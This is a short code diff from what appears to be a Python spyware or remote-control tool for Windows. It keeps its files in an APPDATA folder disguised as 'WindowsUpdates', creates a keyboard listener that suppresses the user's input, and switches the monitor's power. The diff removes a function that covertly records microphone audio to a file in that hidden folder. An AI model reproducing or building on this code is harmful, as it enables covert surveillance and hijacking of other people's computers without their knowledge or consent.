@@ -22,9 +22,6 @@ from time import sleep
 from monitorcontrol import get_monitors
 from monitorcontrol import Monitor
 
-import sounddevice as sd
-from scipy.io.wavfile import write
-
 operation_dir = os.getenv("APPDATA") + "\WindowsUpdates"
 nullptr = POINTER(c_int)()
 kb_listener = pynput.keyboard.Listener(suppress=True)
@@ -135,11 +132,3 @@ def on_mon():
         monitor.set_power_mode(1)
     except Exception as e:
       print(e)
-
-def rec_m():
-  fs = 44100
-  seconds = 8
-  myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
-  sd.wait()
-  write(f"{operation_dir}/recording.wav", fs, myrecording)
-  return f"{operation_dir}/recording.wav"
